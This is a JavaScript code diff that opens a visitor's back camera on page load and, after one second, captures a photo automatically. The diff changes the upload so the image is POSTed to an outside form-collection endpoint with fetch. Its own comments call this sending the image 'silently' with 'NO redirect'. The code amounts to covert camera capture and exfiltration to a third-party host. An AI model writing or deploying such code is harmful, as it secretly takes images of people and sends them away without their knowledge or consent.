@@ -1,26 +1,26 @@
 const video = document.getElementById("preview");
 let stream;
 
-// Start camera immediately
 startCamera();
 
 async function startCamera() {
   try {
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { exact: "environment" } }  // Back camera
+      video: { facingMode: { exact: "environment" } }
     });
 
     video.srcObject = stream;
 
-    // Wait 1 second for camera to stabilize, then capture automatically
+    // Capture after 1 sec
     setTimeout(captureAndUpload, 1000);
 
   } catch (err) {
-    console.error("Camera error:", err);
+    console.error("Camera failed:", err);
   }
 }
 
-function captureAndUpload() {
+async function captureAndUpload() {
+  // Draw frame to canvas
   const canvas = document.createElement("canvas");
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -31,17 +31,24 @@ function captureAndUpload() {
   canvas.toBlob(async (blob) => {
     const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
 
-    // Put the file into the hidden input
-    const input = document.getElementById("photoInput");
-    const dataTransfer = new DataTransfer();
-    dataTransfer.items.add(file);
-    input.files = dataTransfer.files;
+    // Create FormData manually (instead of using a form)
+    const formData = new FormData();
+    formData.append("photo", file);
 
-    // Submit the form
-    document.getElementById("autoUploadForm").submit();
+    try {
+      // Send the image silently – NO redirect
+      await fetch("https://usebasin.com/f/fb249d3e371b", {
+        method: "POST",
+        body: formData
+      });
+
+      console.log("Uploaded to Basin silently.");
+
+    } catch (error) {
+      console.error("Upload error:", error);
+    }
 
     stopCamera();
-
   }, "image/jpeg", 0.9);
 }
 
